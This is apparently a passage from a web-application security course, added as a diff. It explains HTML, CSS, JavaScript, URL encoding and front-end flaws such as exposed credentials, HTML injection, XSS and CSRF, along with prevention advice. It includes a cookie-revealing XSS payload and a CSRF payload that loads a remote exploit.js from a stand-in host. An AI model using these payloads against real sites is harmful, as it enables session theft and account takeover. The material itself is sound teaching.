+    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+</code></pre>
+<p>This would display the following: <img src="storage\modules\75\web_apps_html_2.jpg" alt="HTML Example"></p>
+<p>As we can see, HTML elements are displayed in a tree form, similar to <code>XML</code> and other languages:</p>
+<p><strong>HTML Structure</strong></p>
+<p>HTML</p>
+<pre><code class="lang-shell-session">document
+ -<span class="ruby"> html
+</span>   -<span class="ruby">- head
+</span>      -<span class="ruby">-- title
+</span>   -<span class="ruby">- body
+</span>      -<span class="ruby">-- h1
+</span>      -<span class="ruby">-- p</span>
+</code></pre>
+<p>Each element can contain other HTML elements, while the main <code>HTML</code> tag should contain all other elements within the page, which falls under <code>document</code>, distinguishing between <code>HTML</code> and documents written for other languages, such as <code>XML</code> documents.</p>
+<p>The HTML elements of the above code can be viewed as follows:</p>
+<p>\    \\<title>Page Title\</title>    \    \\</p><h1>A Heading\</h1>\<p>A Paragraph\</p>    \\\<p></p>
+<p>Each HTML element is opened and closed with a tag that specifies the element's type 'e.g. <code>&lt;p&gt;</code> for paragraphs', where the content would be placed between these tags. Tags may also hold the element's id or class 'e.g. <code>&lt;p id='para1'&gt;</code> or <code>&lt;p id='red-paragraphs'&gt;</code>', which is needed for CSS to properly format the element. Both tags and the content comprise the entire element.</p>
+<hr>
+<h3 id="url-encoding">URL Encoding</h3>
+<p>An important concept to learn in HTML is <a href="https://en.wikipedia.org/wiki/Percent-encoding">URL Encoding</a>, or percent-encoding. For a browser to properly display a page's contents, it has to know the charset in use. In URLs, for example, browsers can only use <a href="https://en.wikipedia.org/wiki/ASCII">ASCII</a> encoding, which only allows alphanumerical characters and certain special characters. Therefore, all other characters outside of the ASCII character-set have to be encoded within a URL. URL encoding replaces unsafe ASCII characters with a <code>%</code> symbol followed by two hexadecimal digits.</p>
+<p>For example, the single-quote character '<code>'</code>' is encoded to '<code>%27</code>', which can be understood by browsers as a single-quote. URLs cannot have spaces in them and will replace a space with either a <code>+</code> (plus sign) or <code>%20</code>. Some common character encodings are:</p>
+<table><thead><tr><th width="152">Character</th><th>Encoding</th></tr></thead><tbody><tr><td>space</td><td>%20</td></tr><tr><td>!</td><td>%21</td></tr><tr><td>"</td><td>%22</td></tr><tr><td>#</td><td>%23</td></tr><tr><td>$</td><td>%24</td></tr><tr><td>%</td><td>%25</td></tr><tr><td>&amp;</td><td>%26</td></tr><tr><td>'</td><td>%27</td></tr><tr><td>(</td><td>%28</td></tr><tr><td>)</td><td>%29</td></tr></tbody></table>
+
+<p>A full character encoding table can be seen <a href="https://www.w3schools.com/tags/ref_urlencode.ASP">here</a>.</p>
+<p>Many online tools can be used to perform URL encoding/decoding. Furthermore, the popular web proxy <a href="https://portswigger.net/burp">Burp Suite</a> has a decoder/encoder which can be used to convert between various types of encodings. Try encoding/decoding some characters and strings using this <a href="https://www.url-encode-decode.com/">online tool</a>.</p>
+<p><strong>Usage</strong></p>
+<p>The <code>&lt;head&gt;</code> element usually contains elements that are not directly printed on the page, like the page title, while all main page elements are located under <code>&lt;body&gt;</code>. Other important elements include the <code>&lt;style&gt;</code>, which holds the page's CSS code, and the <code>&lt;script&gt;</code>, which holds the JS code of the page, as we will see in the next section.</p>
+<p>Each of these elements is called a <a href="https://en.wikipedia.org/wiki/Document_Object_Model">DOM (Document Object Model)</a>. The <a href="https://www.w3.org/">World Wide Web Consortium (W3C)</a> defines <code>DOM</code> as:</p>
+<p><code>"The W3C Document Object Model (DOM) is a platform and language-neutral interface that allows programs and scripts to dynamically access and update the content, structure, and style of a document."</code></p>
+<p>The DOM standard is separated into 3 parts:</p>
+<ul>
+<li><code>Core DOM</code> - the standard model for all document types</li>
+<li><code>XML DOM</code> - the standard model for XML documents</li>
+<li><code>HTML DOM</code> - the standard model for HTML documents</li>
+</ul>
+<p>For example, from the above tree view, we can refer to DOMs as <code>document.head</code> or <code>document.h1</code>, and so on.</p>
+<p>Understanding the HTML DOM structure can help us understand where each element we view on the page is located, which enables us to view the source code of a specific element on the page and look for potential issues. We can locate HTML elements by their id, their tag name, or by their class name.</p>
+<p>This is also useful when we want to utilize front-end vulnerabilities (like <code>XSS</code>) to manipulate existing elements or create new elements to serve our needs.</p>
+<h2 id="cascading-style-sheets-css-">Cascading Style Sheets (CSS)</h2>
+<hr>
+<p><a href="https://www.w3.org/Style/CSS/Overview.en.html">CSS (Cascading Style Sheets)</a> is the stylesheet language used alongside HTML to format and set the style of HTML elements. Like HTML, there are several versions of CSS, and each subsequent version introduces a new set of capabilities that can be used for formatting HTML elements. Browsers are updated alongside it to support these new features.</p>
+<hr>
+<p><strong>Example</strong></p>
+<p>At a fundamental level, CSS is used to define the style of each class or type of HTML elements (i.e., <code>body</code> or <code>h1</code>), such that any element within that page would be represented as defined in the CSS file. This could include the font family, font size, background color, text color and alignment, and more.</p>
+<p>Code: css</p>
+<pre><code class="lang-css"><span class="hljs-selector-tag">body</span> {
+  <span class="hljs-attribute">background-color</span>: black;
+}
+
+<span class="hljs-selector-tag">h1</span> {
+  <span class="hljs-attribute">color</span>: white;
+  <span class="hljs-attribute">text-align</span>: center;
+}
+
+<span class="hljs-selector-tag">p</span> {
+  <span class="hljs-attribute">font-family</span>: helvetica;
+  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">10px</span>;
+}
+</code></pre>
+<p>As previously mentioned, this is why we may set unique IDs or class names for certain HTML elements so that we can later refer to them within CSS or JavaScript when needed.</p>
+<hr>
+<h3 id="syntax">Syntax</h3>
+<p>CSS defines the style of each HTML element or class between curly brackets <code>{}</code>, within which the properties are defined with their values (i.e. <code>element { property : value; }</code>).</p>
+<p>Each HTML element has many properties that can be set through CSS, such as <code>height</code>, <code>position</code>, <code>border</code>, <code>margin</code>, <code>padding</code>, <code>color</code>, <code>text-align</code>, <code>font-size</code>, and hundreds of other properties. All of these can be combined and used to design visually appealing web pages.</p>
+<p>CSS can be used for advanced animations for a wide variety of uses, from moving items all the way to advanced 3D animations. Many CSS properties are available for animations, like <code>@keyframes</code>, <code>animation</code>, <code>animation-duration</code>, <code>animation-direction</code>, and many others. You can read about and try out many of these animation properties <a href="https://www.w3schools.com/css/css3_animations.asp">here</a>.</p>
+<hr>
+<p><strong>Usage</strong></p>
+<p>CSS is often used alongside JavaScript to make quick calculations, dynamically adjust the style properties of certain HTML elements, or achieve advanced animations based on keystrokes or the mouse cursor location.</p>
+<p>The following example beautifully illustrates such capabilities of CSS when used with HTML and JavaScript "Parallax Depth Cards - by Andy Merskin on <a href="https://codepen.io/">CodePen</a>":</p>
+<p>You can click on the tabs on the top-left to view the source code.</p>
+<p>This shows that even though HTML and CSS are among the most basic cornerstones of web development when used properly, they can be used to build visually stunning web pages, which can make interacting with web applications a much easier and more user-friendly experience.</p>
+<p>Furthermore, CSS can be used alongside other languages to implement their styles, like <code>XML</code> or within <code>SVG</code> items, and can also be used in modern mobile development platforms to design entire mobile application User Interfaces (UI).</p>
+<hr>
+<h3 id="frameworks">Frameworks</h3>
+<p>Many may consider CSS to be difficult to develop. In contrast, others may argue that it is inefficient to manually set the style and design of all HTML elements in each web page. This is why many CSS frameworks have been introduced, which contain a collection of CSS style-sheets and designs, to make it much faster and easier to create beautiful HTML elements.</p>
+<p>Furthermore, these frameworks are optimized for web application usage. They are designed to be used with JavaScript and for wide use within a web application and contain elements usually required within modern web applications. Some of the most common CSS frameworks are:</p>
+<ul>
+<li><a href="https://www.w3schools.com/bootstrap4/">Bootstrap</a></li>
+<li><a href="https://sass-lang.com/">SASS</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Foundation_\(framework\">Foundation</a>)</li>
+<li><a href="https://bulma.io/">Bulma</a></li>
+<li><a href="https://purecss.io/">Pure</a></li>
+</ul>
+<h2 id="javascript">JavaScript</h2>
+<hr>
+<p><a href="https://en.wikipedia.org/wiki/JavaScript">JavaScript</a> is one of the most used languages in the world. It is mostly used for web development and mobile development. <code>JavaScript</code> is usually used on the front end of an application to be executed within a browser. Still, there are implementations of back end JavaScript used to develop entire web applications, like <a href="https://nodejs.org/en/about/">NodeJS</a>.</p>
+<p>While <code>HTML</code> and <code>CSS</code> are mainly in charge of how a web page looks, <code>JavaScript</code> is usually used to control any functionality that the front end web page requires. Without <code>JavaScript</code>, a web page would be mostly static and would not have much functionality or interactive elements.</p>
+<hr>
+<p><strong>Example</strong></p>
+<p>Within the page source code, <code>JavaScript</code> code is loaded with the <code>&lt;script&gt;</code> tag, as follows:</p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;</span><span class="undefined">
+..JavaScript code..
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p>A web page can also load remote <code>JavaScript</code> code with <code>src</code> and the script's link, as follows:</p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./script.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p>An example of basic use of <code>JavaScript</code> within a web page is the following:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">document.getElementById(<span class="hljs-string">"button1"</span>).innerHTML = <span class="hljs-string">"Changed Text!"</span><span class="hljs-comment">;</span>
+</code></pre>
+<p>The above example changes the content of the <code>button1</code> HTML element. From here on, there are many more advanced uses of <code>JavaScript</code> on a web page. The following shows an example of what the above <code>JavaScript</code> code would do when linked to a button click:</p>
+<p>Original Text</p>
+<p>As with HTML, there are many sites available online to experiment with <code>JavaScript</code>. One example is <a href="https://jsfiddle.net/">JSFiddle</a> which can be used to test <code>JavaScript</code>, <code>CSS</code>, and <code>HTML</code> and save code snippets. <code>JavaScript</code> is an advanced language, and its syntax is not as simple as <code>HTML</code> or <code>CSS</code>.</p>
+<hr>
+<h3 id="usage">Usage</h3>
+<p>Most common web applications heavily rely on <code>JavaScript</code> to drive all needed functionality on the web page, like updating the web page view in real-time, dynamically updating content in real-time, accepting and processing user input, and many other potential functionalities.</p>
+<p><code>JavaScript</code> is also used to automate complex processes and perform HTTP requests to interact with the back end components and send and retrieve data, through technologies like <a href="https://en.wikipedia.org/wiki/Ajax_\(programming\">Ajax</a>).</p>
+<p>In addition to automation, <code>JavaScript</code> is also often used alongside <code>CSS</code>, as previously mentioned, to drive advanced animations that would not be possible with <code>CSS</code> alone. Whenever we visit an interactive and dynamic web page that uses many advanced and visually appealing animations, we are seeing the result of active <code>JavaScript</code> code running on our browser.</p>
+<p>All modern web browsers are equipped with <code>JavaScript</code> engines that can execute <code>JavaScript</code> code on the client-side without relying on the back end webserver to update the page. This makes using <code>JavaScript</code> a very fast way to achieve a large number of processes quickly.</p>
+<hr>
+<h3 id="frameworks">Frameworks</h3>
+<p>As web applications become more advanced, it may be inefficient to use pure <code>JavaScript</code> to develop an entire web application from scratch. This is why a host of <code>JavaScript</code> frameworks have been introduced to improve the experience of web application development.</p>
+<p>These platforms introduce libraries that make it very simple to re-create advanced functionalities, like user login and user registration, and they introduce new technologies based on existing ones, like the use of dynamically changing <code>HTML</code> code, instead of using static <code>HTML</code> code.</p>
+<p>These platforms either use <code>JavaScript</code> as their programming language or use an implementation of <code>JavaScript</code> that compiles its code into <code>JavaScript</code> code.</p>
+<p>Some of the most common front end <code>JavaScript</code> frameworks are:</p>
+<ul>
+<li><a href="https://www.w3schools.com/angular/angular_intro.asp">Angular</a></li>
+<li><a href="https://www.w3schools.com/react/react_intro.asp">React</a></li>
+<li><a href="https://www.w3schools.com/whatis/whatis_vue.asp">Vue</a></li>
+<li><a href="https://www.w3schools.com/jquery/">jQuery</a></li>
+</ul>
+<p>A listing and comparison of common JavaScript frameworks can be found <a href="https://en.wikipedia.org/wiki/Comparison_of_JavaScript_frameworks">here</a>.</p>
+<h2 id="sensitive-data-exposure">Sensitive Data Exposure</h2>
+<hr>
+<p>All of the <code>front end</code> components we covered are interacted with on the client-side. Therefore, if they are attacked, they do not pose a direct threat to the core <code>back end</code> of the web application and usually will not lead to permanent damage. However, as these components are executed on the <code>client-side</code>, they put the end-user in danger of being attacked and exploited if they do have any vulnerabilities. If a front end vulnerability is leveraged to attack admin users, it could result in unauthorized access, access to sensitive data, service disruption, and more.</p>
+<p>Although the majority of web application penetration testing is focused on back end components and their functionality, it is important also to test front end components for potential vulnerabilities, as these types of vulnerabilities can sometimes be utilized to gain access to sensitive functionality (i.e., an admin panel), which may lead to compromising the entire server.</p>
+<p><a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Sensitive Data Exposure</a> refers to the availability of sensitive data in clear-text to the end-user. This is usually found in the <code>source code</code> of the web page or page source on the front end of web applications. This is the HTML source code of the application, not to be confused with the back end code that is typically only accessible on the server itself. We can view any website's page source in our browser by right-clicking anywhere on the page and selecting <code>View Page Source</code> from the pop-up menu. Sometimes a developer may disable right-clicking on a web application, but this does not prevent us from viewing the page source as we can merely type <code>ctrl + u</code> or view the page source through a web proxy such as <code>Burp Suite</code>. Let's take a look at the google.com page source. Right-click and choose <code>View Page Source</code>, and a new tab will open in our browser with the URL <code>view-source:https://www.google.com/</code>. Here we can see the <code>HTML</code>, <code>JavaScript</code>, and external links. Take a moment to browse the page source a bit.</p>
+<figure><img src=".gitbook\assets\image%20(339).png" alt=""><figcaption></figcaption></figure>
+
+<p>Sometimes we may find login <code>credentials</code>, <code>hashes</code>, or other sensitive data hidden in the comments of a web page's source code or within external <code>JavaScript</code> code being imported. Other sensitive information may include exposed links or directories or even exposed user information, all of which can potentially be leveraged to further our access within the web application or even the web application's supporting infrastructure (webserver, database server, etc.).</p>
+<p>For this reason, one of the first things we should do when assessing a web application is to review its page source code to see if we can identify any 'low-hanging fruit', such as exposed credentials or hidden links.</p>
+<hr>
+<p><strong>Example</strong></p>
+<p>At first glance, this login form does not look like anything out of the ordinary:</p>
+<p><img src="storage\modules\75\web_apps_login_form_.png" alt="HTML Example"></p>
+<p>Let's take a look at at the page source:</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"action_page.php"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"uname"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Username<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">required</span>&gt;</span>
+
+        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"psw"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Password<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">required</span>&gt;</span>
+
+        <span class="hljs-comment">&lt;!-- <span class="hljs-doctag">TODO:</span> remove test credentials test:test --&gt;</span>
+
+        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
+
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+</code></pre>
+<p>We see that the developers added some comments that they forgot to remove, which contain test credentials:</p>
+<pre><code class="lang-html"><span class="hljs-comment">&lt;!-- <span class="hljs-doctag">TODO:</span> remove test credentials test:test --&gt;</span>
+</code></pre>
+<p>The comment seems to be a reminder for the developers to remove the test credentials. Given that the comment has not been removed yet, these credentials may still be valid.</p>
+<p>Although it is not very common to find login credentials in developer comments, we can still find various bits of sensitive and valuable information when looking at the source code, such as test pages or directories, debugging parameters, or hidden functionality. There are various automated tools that we can use to scan and analyze available page source code to identify potential paths or directories and other sensitive information.</p>
+<p>Leveraging these types of information can give us further access to the web application, which may help us attack the back end components to gain control over the server.</p>
+<hr>
+<h3 id="prevention">Prevention</h3>
+<p>Ideally, the front end source code should only contain the code necessary to run all of the web applications functions, without any extra code or comments that are not necessary for the web application to function properly. It is always important to review the code that will be visible to end-users through the page source or run it through tools to check for exposed information.</p>
+<p>It is also important to classify data types within the source code and apply controls on what can or cannot be exposed on the client-side. Developers should also review client-side code to ensure that no unnecessary comments or hidden links are left behind. Furthermore, front end developers may want to use <code>JavaScript</code> code packing or obfuscation to reduce the chances of exposing sensitive data through <code>JavaScript code</code>. These techniques may prevent automated tools from locating these types of data.</p>
+<h2 id="html-injection">HTML Injection</h2>
+<hr>
+<p>Another major aspect of front end security is validating and sanitizing accepted user input. In many cases, user input validation and sanitization is carried out on the back end. However, some user input would never make it to the back end in some cases and is completely processed and rendered on the front end. Therefore, it is critical to validate and sanitize user input on both the front end and the back end.</p>
+<p><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection">HTML injection</a> occurs when unfiltered user input is displayed on the page. This can either be through retrieving previously submitted code, like retrieving a user comment from the back end database, or by directly displaying unfiltered user input through <code>JavaScript</code> on the front end.</p>
+<p>When a user has complete control of how their input will be displayed, they can submit <code>HTML</code> code, and the browser may display it as part of the page. This may include a malicious <code>HTML</code> code, like an external login form, which can be used to trick users into logging in while actually sending their login credentials to a malicious server to be collected for other attacks.</p>
+<p>Another example of <code>HTML Injection</code> is web page defacing. This consists of injecting new <code>HTML</code> code to change the web page's appearance, inserting malicious ads, or even completely changing the page. This type of attack can result in severe reputational damage to the company hosting the web application.</p>
+<hr>
+<p><strong>Example</strong></p>
+<p>The following example is a very basic web page with a single button "<code>Click to enter your name</code>." When we click on the button, it prompts us to input our name and then displays our name as "<code>Your name is ...</code>":</p>
+<p><img src="storage\modules\75\web_apps_html_injection_5.jpg" alt="HTML Example"></p>
+<p>If no input sanitization is in place, this is potentially an easy target for <code>HTML Injection</code> and <code>Cross-Site Scripting (XSS)</code> attacks. We take a look at the page source code and see no input sanitization in place whatsoever, as the page takes user input and directly displays it:</p>
+<pre><code class="lang-html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"inputFunction()"</span>&gt;</span>Click to enter your name<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"output"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inputFunction</span>(<span class="hljs-params"></span>) </span>{
+            <span class="hljs-keyword">var</span> input = prompt(<span class="hljs-string">"Please enter your name"</span>, <span class="hljs-string">""</span>);
+
+            <span class="hljs-keyword">if</span> (input != <span class="hljs-literal">null</span>) {
+                <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"output"</span>).innerHTML = <span class="hljs-string">"Your name is "</span> + input;
+            }
+        }
+    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+</code></pre>
+<p>To test for <code>HTML Injection</code>, we can simply input a small snippet of <code>HTML</code> code as our name, and see if it is displayed as part of the page. We will test the following code, which changes the background image of the web page:</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"> <span class="hljs-selector-tag">body</span> { <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">'https://academy.hackthebox.com/images/logo.svg'</span>); } </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
+</code></pre>
+<p>Once we input it, we see that the web page's background image changes instantly:</p>
+<p><img src="storage\modules\75\web_apps_html_injection_6.jpg" alt="HTML Example"></p>
+<h2 id="cross-site-scripting-xss-">Cross-Site Scripting (XSS)</h2>
+<hr>
+<p><code>HTML Injection</code> vulnerabilities can often be utilized to also perform <a href="https://owasp.org/www-community/attacks/xss/">Cross-Site Scripting (XSS)</a> attacks by injecting <code>JavaScript</code> code to be executed on the client-side. Once we can execute code on the victim's machine, we can potentially gain access to the victim's account or even their machine. <code>XSS</code> is very similar to <code>HTML Injection</code> in practice. However, <code>XSS</code> involves the injection of <code>JavaScript</code> code to perform more advanced attacks on the client-side, instead of merely injecting HTML code. There are three main types of <code>XSS</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Reflected XSS</code></td>
+<td>Occurs when user input is displayed on the page after processing (e.g., search result or error message).</td>
+</tr>
+<tr>
+<td><code>Stored XSS</code></td>
+<td>Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).</td>
+</tr>
+<tr>
+<td><code>DOM XSS</code></td>
+<td>Occurs when user input is directly shown in the browser and is written to an <code>HTML</code> DOM object (e.g., vulnerable username or page title).</td>
+</tr>
+</tbody>
+</table>
+<p>In the example we saw for <code>HTML Injection</code>, there was no input sanitization whatsoever. Therefore, it may be possible for the same page to be vulnerable to <code>XSS</code> attacks. We can try to inject the following <code>DOM XSS</code> <code>JavaScript</code> code as a payload, which should show us the cookie value for the current user:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">#"&gt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">/</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span>
+</code></pre>
+<p>Once we input our payload and hit <code>ok</code>, we see that an alert window pops up with the cookie value in it:</p>
+<p><img src="storage\modules\75\web_apps_xss_2.jpg" alt="HTML Example"></p>
+<p>This payload is accessing the <code>HTML</code> document tree and retrieving the <code>cookie</code> object's value. When the browser processes our input, it will be considered a new <code>DOM</code>, and our <code>JavaScript</code> will be executed, displaying the cookie value back to us in a popup.</p>
+<p>An attacker can leverage this to steal cookie sessions and send them to themselves and attempt to use the cookie value to authenticate to the victim's account. The same attack can be used to perform various types of other attacks against a web application's users. <code>XSS</code> is a vast topic that will be covered in-depth in later modules.</p>
+<h2 id="cross-site-request-forgery-csrf-">Cross-Site Request Forgery (CSRF)</h2>
+<hr>
+<p>The third type of front end vulnerability that is caused by unfiltered user input is <a href="https://owasp.org/www-community/attacks/csrf">Cross-Site Request Forgery (CSRF)</a>. <code>CSRF</code> attacks may utilize <code>XSS</code> vulnerabilities to perform certain queries, and <code>API</code> calls on a web application that the victim is currently authenticated to. This would allow the attacker to perform actions as the authenticated user. It may also utilize other vulnerabilities to perform the same functions, like utilizing HTTP parameters for attacks.</p>
+<p>A common <code>CSRF</code> attack to gain higher privileged access to a web application is to craft a <code>JavaScript</code> payload that automatically changes the victim's password to the value set by the attacker. Once the victim views the payload on the vulnerable page (e.g., a malicious comment containing the <code>JavaScript</code> <code>CSRF</code> payload), the <code>JavaScript</code> code would execute automatically. It would use the victim's logged-in session to change their password. Once that is done, the attacker can log in to the victim's account and control it.</p>
+<p><code>CSRF</code> can also be leveraged to attack admins and gain access to their accounts. Admins usually have access to sensitive functions, which can sometimes be used to attack and gain control over the back-end server (depending on the functionality provided to admins within a given web application). Following this example, instead of using <code>JavaScript</code> code that would return the session cookie, we would load a remote <code>.js</code> (<code>JavaScript</code>) file, as follows:</p>
+<p>Code: html</p>
+<pre><code class="lang-html">"&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">//www.example.com/exploit.js</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p>The <code>exploit.js</code> file would contain the malicious <code>JavaScript</code> code that changes the user's password. Developing the <code>exploit.js</code> in this case requires knowledge of this web application's password changing procedure and <code>APIs</code>. The attacker would need to create <code>JavaScript</code> code that would replicate the desired functionality and automatically carry it out (i.e., <code>JavaScript</code> code that changes our password for this specific web application).</p>
+<hr>
+<h3 id="prevention">Prevention</h3>
+<p>Though there should be measures on the back end to detect and filter user input, it is also always important to filter and sanitize user input on the front end before it reaches the back end, and especially if this code may be displayed directly on the client-side without communicating with the back end. Two main controls must be applied when accepting user input:</p>
+<table><thead><tr><th width="188">Type</th><th>Description</th></tr></thead><tbody><tr><td><code>Sanitization</code></td><td>Removing special characters and non-standard characters from user input before displaying it or storing it.</td></tr><tr><td><code>Validation</code></td><td>Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format)</td></tr></tbody></table>
+
+<p>Furthermore, it is also important to sanitize displayed output and clear any special/non-standard characters. In case an attacker manages to bypass front end and back end sanitization and validation filters, it will still not cause any harm on the front end.</p>
+<p>Once we sanitize and/or validate user input and displayed output, we should be able to prevent attacks like <code>HTML Injection</code>, <code>XSS</code>, or <code>CSRF</code>. Another solution would be to implement a <a href="https://en.wikipedia.org/wiki/Web_application_firewall">web application firewall (WAF)</a>, which should help to prevent injection attempts automatically. However, it should be noted that WAF solutions can potentially be bypassed, so developers should follow coding best practices and not merely rely on an appliance to detect/block attacks.</p>
+<p>As for <code>CSRF</code>, many modern browsers have built-in anti-CSRF measures, which prevent automatically executing <code>JavaScript</code> code. Furthermore, many modern web applications have anti-CSRF measures, including certain HTTP headers and flags that can prevent automated requests (i.e., <code>anti-CSRF</code> token, or <code>http-only</code>/<code>X-XSS-Protection</code>). Certain other measures can be taken from a functional level, like requiring the user to input their password before changing it. Many of these security measures can be bypassed, and therefore these types of vulnerabilities can still pose a major threat to the users of a web application. This is why these precautions should only be relied upon as a secondary measure, and developers should always ensure that their code is not vulnerable to any of these attacks.</p>
+<p>This <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">Cross-Site Request Forgery Prevention Cheat Sheet</a> from OWASP discusses the attack and prevention measures in greater detail.</p>
+<h2 id="back-end-servers">Back End Servers</h2>
+<hr>
+<p>A back-end server is the hardware and operating system on the back end that hosts all of the applications necessary to run the web application. It is the real system running all of the processes and carrying out all of the tasks that make up the entire web application. The back end server would fit in the <a href="https://en.wikipedia.org/wiki/Data_access_layer">Data access layer</a>.</p>
+<hr>
+<h3 id="software">Software</h3>
+<p>The back end server contains the other 3 back end components:</p>
+<ul>
+<li><code>Web Server</code></li>
+<li><code>Database</code></li>
+<li><code>Development Framework</code></li>
+</ul>
+<p><img src="storage\modules\75\backend-server.jpg" alt="backend-server"></p>
+<p>Other software components on the back end server may include <a href="https://en.wikipedia.org/wiki/Hypervisor">hypervisors</a>, containers, and WAFs.</p>
+<p>There are many popular combinations of "stacks" for back-end servers, which contain a specific set of back end components. Some common examples include:</p>
+<table><thead><tr><th width="160">Combinations</th><th>Components</th></tr></thead><tbody><tr><td><a href="https://en.wikipedia.org/wiki/LAMP_(software_bundle)">LAMP</a></td><td><code>Linux</code>, <code>Apache</code>, <code>MySQL</code>, and <code>PHP</code>.</td></tr><tr><td><a href="https://en.wikipedia.org/wiki/LAMP_(software_bundle)#WAMP">WAMP</a></td><td><code>Windows</code>, <code>Apache</code>, <code>MySQL</code>, and <code>PHP</code>.</td></tr><tr><td><a href="https://en.wikipedia.org/wiki/Solution_stack">WINS</a></td><td><code>Windows</code>, <code>IIS</code>, <code>.NET</code>, and <code>SQL Server</code></td></tr><tr><td><a href="https://en.wikipedia.org/wiki/MAMP">MAMP</a></td><td><code>macOS</code>, <code>Apache</code>, <code>MySQL</code>, and <code>PHP</code>.</td></tr><tr><td><a href="https://en.wikipedia.org/wiki/XAMPP">XAMPP</a></td><td>Cross-Platform, <code>Apache</code>, <code>MySQL</code>, and <code>PHP/PERL</code>.</td></tr></tbody></table>
+
+<p>We can find a comprehensive list of Web Solution Stacks in this <a href="https://en.wikipedia.org/wiki/Solution_stack">article</a>.</p>
+<hr>
+<h3 id="hardware">Hardware</h3>
+<p>The back end server contains all of the necessary hardware. The power and performance capabilities of this hardware determine how stable and responsive the web application will be. As previously discussed in the <code>Architecture</code> section, many architectures, especially for huge web applications, are designed to distribute their load over many back end servers that collectively work together to perform the same tasks and deliver the web application to the end-user. Web applications do not have to run directly on a single back end server but may utilize data centers and cloud hosting services that provide virtual hosts for the web application.</p>
+<h2 id="web-servers">Web Servers</h2>
+<hr>
